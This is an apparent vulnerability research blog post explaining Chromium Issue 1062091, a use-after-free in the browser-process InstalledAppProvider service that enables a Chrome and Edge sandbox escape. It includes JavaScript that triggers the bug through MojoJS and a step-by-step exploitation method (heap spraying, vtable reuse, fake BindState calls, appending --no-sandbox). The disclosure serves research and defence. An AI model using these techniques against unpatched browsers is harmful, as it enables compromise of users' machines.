---
layout: post
title: "Cleanly Escaping the Chrome Sandbox"
description: This post will explain how we discovered and exploited Issue 1062091, a use-after-free (UAF) in the browser process leading to a sandbox escape in Google Chrome as well as Chromium-based Edge.
modified: 2020-04-20
category:
 - research
imagefeature: false
comments: true
featured: true
kramdown:
  syntax_highlighter_opts:
    css_class: 'highlight'
    default_lang: 'c++'
    span:
    block:
      line_numbers: false
---

##### Written by Tim Becker (tjbecker)

This post will explain how we discovered and exploited [Issue 1062091][bug report], a use-after-free (UAF) in the browser process leading to a sandbox escape in Google Chrome as well as Chromium-based Edge.

## Background

Our goal is to make this post accessible to those unfamiliar with Chrome exploitation, so we'll start with some background on Chrome's security architecture and IPC design. Note that all of this section applies to Chromium-based Edge as well, which has been shipping by default as of January 15, 2020.

### Chrome Process Architecture

A key pillar of Chrome's security architecture is sandboxing. Chrome limits most of the attack surface of the web (e.g. DOM rendering, script execution, media decoding, etc.) to sandboxed processes. There is one central process, known as the _browser process_, which runs completely unsandboxed. [Here][process diagram] is a nice diagram showing the attack surface in each process and the various communication channels between them.

In addition to sandboxing, Chrome implements [site isolation][site isolation], which ensures that data from distinct origins are stored and handled in different sandboxed processes. The effect is that compromising a sandboxed process should not even allow an attacker to leak the user's browsing data for other origins.

A result of this architecture is that most Chrome exploits require two or more bugs: at least one to get code execution in a sandboxed process (typically a renderer process) and at least one to escape the sandbox. The bug we'll look at allows a compromised renderer process to escape the sandbox.

### Mojo IPC

Chrome processes communicate with one another via two IPC mechanisms: _legacy IPC_ and _Mojo_. Legacy IPC is nearly finished being phased out in favor of Mojo and will not be relevant for the discussion of this bug, so we'll only focus on Mojo.

Quoting from the [Mojo Docs][mojo docs],

> Mojo is a collection of runtime libraries providing a platform-agnostic abstraction of common IPC primitives, a message IDL format, and a bindings library with code generation for multiple target languages to facilitate convenient message passing across arbitrary inter- and intra-process boundaries.

We'll expand on the relevant parts for this post. First, here is the Mojo interface definition for the vulnerable code:

```c++
// Represents a system application related to a particular web app.
// See: https://www.w3.org/TR/appmanifest/#dfn-application-object
struct RelatedApplication {
  string platform;
  // TODO(mgiuca): Change to url.mojom.Url (requires changing
  // WebRelatedApplication as well).
  string? url;
  string? id;
  string? version;
};

// Mojo service for the getInstalledRelatedApps implementation.
// The browser process implements this service and receives calls from
// renderers to resolve calls to navigator.getInstalledRelatedApps().
interface InstalledAppProvider {
  // Filters |relatedApps|, keeping only those which are both installed on the
  // user's system, and related to the web origin of the requesting page.
  // Also appends the app version to the filtered apps.
  FilterInstalledApps(array<RelatedApplication> related_apps, url.mojom.Url manifest_url)
      => (array<RelatedApplication> installed_apps);
};
```

During a Chrome build, this interface definition is translated into interfaces and proxy objects for each target language (e.g. C++, Java, and even JavaScript). This particular interface was originally implemented only on Android using the Java Mojo bindings, but recently experimental support for Windows was implemented in C++. Our exploit will use the JavaScript bindings (running in a compromised renderer process) to call this C++ implementation (running in the browser process).

This interface defines one method, `FilterInstalledApps`. By default, all methods are asynchronous (there is a `[Sync]` attribute for overriding this default). In the generated C++ interface, this means the method takes an extra argument which is a callback to invoke with the result. In JavaScript, the function instead returns a `Promise`.

Knowing some Mojo lingo will help with reading the code later in this post. Note that [Mojo has recently changed these names][mojo rename], but not all of the code and docs have been transitioned yet, so we'll give both names where necessary. Also, some of these types are generic over the Mojo interface, but we'll simply refer to the types for `InstalledAppProvider`.

* A `MessagePipe` is a channel over which Mojo messages are sent. Messages include method invocations and their replies.
* A `Remote<InstalledAppProvider>` (still called a `InstalledAppProviderPtr` in the JavaScript bindings) is a proxy object on which one invokes the methods defined in the interface. It ties one end of a `MessagePipe` to a particular interface.
* A `PendingReceiver<InstalledAppProvider>` wraps the other end of the `MessagePipe`. A `PendingReceiver` must be _bound_ to an implementation of the `InstalledAppProvider` interface in order to route the messages to the appropriate implementation. This binding is called a `Receiver<InstalledAppProvider>`.
* A `SelfOwnedReceiver<InstalledAppProvider>` is a special type of binding used to tie the lifetime of an implementation object to the lifetime of the underlying `MessagePipe`. A `SelfOwnedReceiver` owns a `std::unique_ptr` to the implementation and is responsible for deleting it when the `MessagePipe` is closed or encounters some error.

There is _a lot_ more that could be said about Mojo, but it is not necessary for this post. For a more details, we would recommend skimming [the docs][mojo docs].

### RenderFrameHost and Frame-Bound Interfaces

Every frame (e.g. a main frame or an iframe) in a renderer process is backed by a `RenderFrameHost` in the browser process. Note that one renderer process might contain multiple frames, provided they are all from the same origin. Many of the Mojo interfaces provided by the browser are acquired through the `RenderFrameHost`.

During the `RenderFrameHost` initialization, a `BinderMap` is populated with a callback for each exposed Mojo interface:

```c++
void PopulateFrameBinders(RenderFrameHostImpl* host,
                          service_manager::BinderMap* map) {
  ...
  map->Add<blink::mojom::InstalledAppProvider>(
      base::BindRepeating(&RenderFrameHostImpl::CreateInstalledAppProvider,
                          base::Unretained(host)));
  ...
}
```

When a renderer frame requests an interface, the corresponding callback in the `BinderMap` is invoked and passed the `PendingReceiver`:

```c++
void RenderFrameHostImpl::CreateInstalledAppProvider(
    mojo::PendingReceiver<blink::mojom::InstalledAppProvider> receiver) {
  InstalledAppProviderImpl::Create(this, std::move(receiver));
}
```

```c++
// static
void InstalledAppProviderImpl::Create(
    RenderFrameHost* host,
    mojo::PendingReceiver<blink::mojom::InstalledAppProvider> receiver) {
  mojo::MakeSelfOwnedReceiver(std::make_unique<InstalledAppProviderImpl>(host),
                              std::move(receiver));
}
```

In this case, a new `InstalledAppProviderImpl` is created and the `PendingReceiver` is bound with a `SelfOwnedReceiver`.

## The Bug

As described above, the `SelfOwnedReceiver` holds a `unique_ptr` to the `InstalledAppProviderImpl`, meaning the `Impl` will stay alive as long as the underlying `MessagePipe` stays connected. Additionally, the `InstalledAppProviderImpl` holds a raw pointer to the `RenderFrameHost`:

```c++
InstalledAppProviderImpl::InstalledAppProviderImpl(
    RenderFrameHost* render_frame_host)
    : render_frame_host_(render_frame_host) {
  DCHECK(render_frame_host_);
}
```

When the `FilterInstalledApps` method is invoked, a virtual function call is made on this raw pointer:

```c++
void InstalledAppProviderImpl::FilterInstalledApps(
    std::vector<blink::mojom::RelatedApplicationPtr> related_apps,
    const GURL& manifest_url,
    FilterInstalledAppsCallback callback) {
  if (render_frame_host_->GetProcess()->GetBrowserContext()->IsOffTheRecord()) {
    std::move(callback).Run(std::vector<blink::mojom::RelatedApplicationPtr>());
    return;
  }

  ...
}
```

So if this method is invoked after the `RenderFrameHost` has been freed, a use-after-free will occur.

### A Bug's Life

This bug was introduced in [this commit][commit introduced], which landed in Chrome 81.0.4041.0. A few weeks later, the bug was coincidentally moved behind an experimental command line flag in [this commit][commit moved]. However, this change landed in Chrome 82.0.4065.0, so the bug would have been reachable on all Desktop platforms in Chrome Stable 81.

## Exploitation

### Triggering the bug

While it may be possible to trigger the bug from pure JavaScript, it almost certainly would not be exploitable. Instead, we'll simulate a compromised renderer process by enabling the MojoJS blink bindings (with `--enable-blink-features=MojoJS` on the Chrome command line). These bindings expose the Mojo platform directly to JavaScript, allowing us to bypass the Blink bindings entirely. Note that these bindings can be enabled by a compromised renderer process by flipping a bit in memory and then creating a new JavaScript context, so our exploit code could easily be used in a bug chain.

As a first attempt to trigger the bug, we used the approach from [a similar bug report][similar bug]. The idea is to have the top frame spawn a few subframes, each of which will acquire handles to a bunch of `InstalledAppProvider` instances for their frame. The subframes call `filterInstalledApps` repeatedly to clog the Mojo message pipes. After a few seconds, the top frame will remove the subframes, causing the backing `RenderFrameHost`s to be freed. This also causes a connection error on the `InstalledAppProvider` `MessagePipe`s, but the hope is that the connection error will not be processed until after a `filterInstalledApps` call dereferences the freed pointer.

We create a page with the following script:

```javascript
function allocate_rfh() {
  var iframe = document.createElement("iframe");
  iframe.src = window.location + "#child"; // designate the child by hash
  document.body.appendChild(iframe);
  return iframe;
}
function deallocate_rfh(iframe) {
  document.body.removeChild(iframe);
}
if (window.location.hash == "#child") {
  var ptrs = new Array(4096).fill(null).map(() => {
    var pipe = Mojo.createMessagePipe();
    Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,
                       pipe.handle1);
    return new blink.mojom.InstalledAppProviderPtr(pipe.handle0);
  });
  setTimeout(() => ptrs.map((p) => {
    p.filterInstalledApps([], new url.mojom.Url({url: window.location.href}));
    p.filterInstalledApps([], new url.mojom.Url({url: window.location.href}));
  }), 2000);
} else {
  var frames = new Array(4).fill(null).map(() => allocate_rfh());
  setTimeout(() => frames.map((f) => deallocate_rfh(f)), 15000);
}
setTimeout(() => window.location.reload(), 16000);
```

After a few refreshes, we finally hit the bug:

```
==8779==ERROR: AddressSanitizer: heap-use-after-free on address 0x620000067080 at pc 0x7f1aafa73589 bp 0x7ffed99af5d0 sp 0x7ffed99af5c8
READ of size 8 at 0x620000067080 thread T0 (chrome)
```

### Removing the Race

For exploitation, we'd like to have more control over when the UAF is triggered. If we wrote our exploit in native code, we would be able to keep the Mojo connection alive even after the subframe is freed, because these frames are running in the same process. However, we'd ideally like to stay in JavaScript.

We soon discovered the MojoJSTest bindings, which expose a few extra Mojo features to JavaScript. The relevant feature for our exploit is `MojoInterfaceInterceptor`, which is capable of intercepting `Mojo.bindInterface` calls from other frames in the same-process. We can use this to pass the endpoint handle to the parent frame before the child frame is destructed. Here's how this looks:

```javascript
var kPwnInterfaceName = "pwn";

// runs in the child frame
function sendPtr() {
  var pipe = Mojo.createMessagePipe();
  // bind the InstalledAppProvider with the child rfh
  Mojo.bindInterface(blink.mojom.InstalledAppProvider.name,
    pipe.handle1, "context", true);

  // pass the endpoint handle to the parent frame
  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
}

// runs in the parent frame
function getFreedPtr() {
  return new Promise(function (resolve, reject) {
    var frame = allocateRFH(window.location.href + "#child"); // designate the child by hash

    // intercept bindInterface calls for this process to accept the handle from the child
    let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");
    interceptor.oninterfacerequest = function(e) {
      interceptor.stop();

      // bind and return the remote
      var provider_ptr = new blink.mojom.InstalledAppProviderPtr(e.handle);
      freeRFH(frame);
      resolve(provider_ptr);
    }
    interceptor.start();
  });
}
```

So we now can use `getFreedPtr()` to get an `InstalledAppProviderPtr` for a freed `RenderFrameHost`. Calling `filterInstalledApps` then immediately triggers the UAF.

### Replacing the RenderFrameHostImpl

The bug gives a virtual function call on a freed `RenderFrameHost`. For those unfamiliar with how virtual calls work (or those that need a refresher), [this post][vtable post] might be helpful. To exploit this bug we want to control the freed object's data. We can use the usual strategy to replace a freed object in the browser process: blob spraying. For those unfamiliar, here's a one sentence overview: After we free the subframe, we create a bunch of blobs (using either the [Blob API][blob api] or the Mojo bindings) containing controlled data of length `sizeof(RenderFrameHostImpl)` (this is 0xc38 on Chrome 81.0.4044.69), and we hope that our data ends up replacing the freed object in on the heap.

Conveniently, this is *extremely* likely to succeed in the case of this bug. The reason is that the `RenderFrameHost` is a huge object, so very few allocations are being made in that heap bucket. In our testing, usually the first blob we allocated replaced the object, but we do a few extra for good measure.

We now face the question: what do we replace the vtable pointer with? Without a leaked heap pointer from the Browser Process, we can't point the vtable to data we control, so there's no obvious way to jump to arbitrary code. In fact, we seemingly don't know the address of *anything*.

However, there is a well-known weakness of ASLR on Windows: DLL base addresses are not randomized each time it is loaded. Therefore, any shared DLLs between the renderer process and the browser process will be loaded at the same base address -- and this includes `chrome.dll`, the massive 120MB binary containing most of Chrome's code. Our exploit will assume we have this base address, which is trivial for a compromised renderer to obtain.

The `.rdata` section of this DLL contains vtables for every virtual class defined within it. Using these address for our vtable pointer lets us call any virtual function on a fully controlled object.

### Exploit Plan: A shortcut

Getting full code execution in the browser would likely require more machinery than is available within `chrome.dll` (e.g. gadgets from `kernel32.dll` or `ntdll.dll`). For instance, we could use stack pivot into our controlled data and use ROP to allocate some RWX memory, copy shellcode, and execute it. But in the interest of keeping our exploit simple, we can use a shortcut.

Since we're already relying on a renderer exploit, all we technically need is a renderer process running unsandboxed. Thankfully, this is much simpler to achieve. Each process in chrome has a global `CommandLine` object which holds the parsed command line switches for that process. When the browser process creates a new subprocess, it passes certain switches (if they're present) from its `CommandLine` to the child process. One such switch is `--no-sandbox`, which does exactly what it sounds like: disables the sandbox. Conveniently, there's a function in `chrome.dll` which gives us an easy way to append this flag to a `CommandLine` object:

```c++
void SetCommandLineFlagsForSandboxType(base::CommandLine* command_line,
                                       SandboxType sandbox_type) {
  switch (sandbox_type) {
    case SandboxType::kNoSandbox:
      command_line->AppendSwitch(switches::kNoSandbox);
      break;
      ...
  }
}
```

So in our case, escaping the sandbox can be reduced to calling this function with the right arguments. Note that this is not a virtual function, and we don't know the address of the browser's `CommandLine` object, so we do have *some* work to do.

### Avoiding a Crash

In order to build stronger primitives, it might be nice to repeatedly trigger the bug. Also, the above strategy requires that the browser keeps running after exploitation. However, recall that the buggy call is followed by two more virtual function calls:

```c++
if (render_frame_host_->GetProcess()->GetBrowserContext()->IsOffTheRecord()) {
  ...
}
```

If we redirect the call to `GetProcess()` to some other virtual function, we must make sure it returns a pointer which is safe to make these two virtual calls on. Fortunately, there's an easy trick to fix this. We can make the first virtual call invoke any virtual function of the form:

```c++
SomeType* SomeClass::SomeMethod() {
  return &class_member_;
}
```

Calling one of these functions will return a pointer which is a small offset ahead of `render_frame_host_`, so it still points to our controlled data. For convenience, we pick one which returns a pointer 8 bytes ahead of `this`, e.g.

```c++
content::ContentClient* ChromeMainDelegate::CreateContentClient() {
  return &chrome_content_client_;
}
```

Repeating this idea for the second virtual call gives us control of the final call with no constraints on its return value. Here's a visual:

{:.center}
![Vtable pointers to avoid a crash][generic blob diagram]


### Getting a Heap Leak

Given our primitive, leaking a heap pointer is actually quite easy. We call any virtual function which allocates and stores the result as a member:

```c++
SomeClass::SomeMethod() {
  some_member_ = new Foo();
}
```

Then, recall that we've replaced the `RenderFrameHost` with a Blob, so we can actually ask the browser to send us the contents back! When we do, we should find the heap pointer within.

Once we have a heap pointer, we can use heap spraying to put controlled data at a guessable address. **Note**: In our actual exploit, we used a few extra gadgets to find the precise address of the original freed `RenderFrameHost`, but this is not totally necessary.

### Arbitrary Call

We want to turn our arbitrary virtual call into an arbitrary call to any function. One easy idea is to use our heap leak to place a pointer to our target function at a known (guessable) address and use that as our vtable pointer. This succeeds in calling the target function, but unfortunately the arguments would still be uncontrolled.

To control the arguments too, we use a different approach. Recall that we control the class members during our targeted virtual call, so we find a virtual function that invokes a callback class member, e.g.

```c++
class FileSystemDispatcher::WriteListener
    : public mojom::blink::FileSystemOperationListener {
 public:
 ...
  void DidWrite(int64_t byte_count, bool complete) override {
    write_callback_.Run(byte_count, complete);
  }

 private:
  ...
  WriteCallback write_callback_;
};
```

where `WriteCallback` is just an alias for a particular type of `base::Callback`:

```c++
using WriteCallback =
    base::RepeatingCallback<void(int64_t bytes, bool complete)>;
```

In Chrome, `Callback` objects are used to store function pointers with some bound arguments. In terms of memory layout, they simply contain a pointer to a `BindState`, which has the following layout:

| Offset | Field                       |
|--------|-----------------------------|
| 0      | `refcount`                  |
| 8      | `polymorphic_invoke`        |
| 16     | `destructor`                |
| 24     | `query_cancellation_traits` |
| 32     | `functor`                   |
| 40     | `arg0`                      |
| 48     | `arg1`                      |
| ...    |  ...                        |

Not all of these fields matter for us. `polymorphic_invoke` is a pointer to a function responsible for invoking `functor` (the callback function) with the bound arguments. Clearly `polymorphic_invoke` must know how many bound arguments there are, as well as their types, so we choose an invoker function that passes as many args as we need (2 suffices for our target function). Then, using our heap leak, we build a fake `BindState` object with our target function and arguments and place it at a known address in the heap. Now we trigger the UAF to invoke `FileSystemDispatcher::WriteListener::DidWrite` and control the `BindState` pointer of the callback.

{:.center}
![Replacement blob for controlled arbitrary call][bindstate blob diagram]

### Leaking the `CommandLine` Pointer

The global `CommandLine` object is allocated during Chrome's initialization, and a pointer is stored in the `.data` section of `chrome.dll`:

```c++
// The singleton CommandLine representing the current process's command line.
static CommandLine* current_process_commandline_;
```

There are surely many ways to obtain this. Given that we can already call any function, we simply call the following function to copy the pointer into one of our blobs, and then read it back.

```c++
static
void copy64(void* dst, const void* src)
{
       memmove(dst, src, sizeof(cmsFloat64Number));
}
```

### Exploit Summary

Using the above pieces, we outline the full exploit strategy:

1. Use a renderer exploit to enable the MojoJS,MojoJSTest bindings and find the base address of `chrome.dll`.
2. Trigger the UAF to store a new allocation in the blob and read it back to leak a heap pointer.
3. Spray `BindState`s for `copy64(blob_ptr, current_process_commandline_)`, trigger the UAF, and read back the command line pointer.
4. Spray `BindState`s for `SetCommandLineFlagsForSandboxType(cmd_line, SandboxType::kNoSandbox)` and trigger the UAF.
5. Spawn a new renderer process (e.g. using an iframe to a different controlled origin).
6. Use the renderer exploit again to compromise the unsandboxed renderer process.

## Conclusions

All things considered, this bug demonstrates almost ideal conditions for use-after-free exploitation. Replacing the freed object was highly reliable because the object was in a rarely-used heap bucket, and by avoiding the race condition, we could safely trigger the bug as many times as needed. As a result, we were able to achieve process-continuation, meaning that chrome will continue to behave normally from the user's perspective post-exploitation. Further, since we only use code gadgets from `chrome.dll`, the exploit is easy to adapt to other platforms - especially Mac OS, which also lacks inter-process library randomization.

If you're curious to see all the details, you can find the full exploit in [our bug report][bug report].

### Further Reading

* [Project Zero Post on Escaping the Chrome Sandbox][virtually unlimited memory]
* [Mojo docs][mojo docs]

[bug report]: https://bugs.chromium.org/p/chromium/issues/detail?id=1062091
[process diagram]: https://docs.google.com/drawings/d/1TuECFL9K7J5q5UePJLC-YH3satvb1RrjLRH-tW_VKeE/edit
[site isolation]: https://www.chromium.org/Home/chromium-security/site-isolation
[mojo docs]: https://chromium.googlesource.com/chromium/src.git/+/master/mojo/README.md
[mojo rename]: https://bugs.chromium.org/p/chromium/issues/detail?id=955171
[similar bug]: https://bugs.chromium.org/p/chromium/issues/detail?id=977195
[commit introduced]: https://chromium.googlesource.com/chromium/src/+/0002875db334deb69d41f74adc15ad40089f04c5%5E%21/#F0
[commit moved]: https://chromium.googlesource.com/chromium/src/+/d37dc2558a7c841c8439f0cae4dfa5807e56f61e
[blob api]: https://developer.mozilla.org/en-US/docs/Web/API/Blob
[vtable post]: https://pabloariasal.github.io/2017/06/10/understanding-virtual-tables/
[generic blob diagram]: {{ site.url }}/images/2020-04-20/GenericBlobDiagram.png
[bindstate blob diagram]: {{ site.url }}/images/2020-04-20/BindStateBlobDiagram.png
[virtually unlimited memory]: https://googleprojectzero.blogspot.com/2019/04/virtually-unlimited-memory-escaping.html
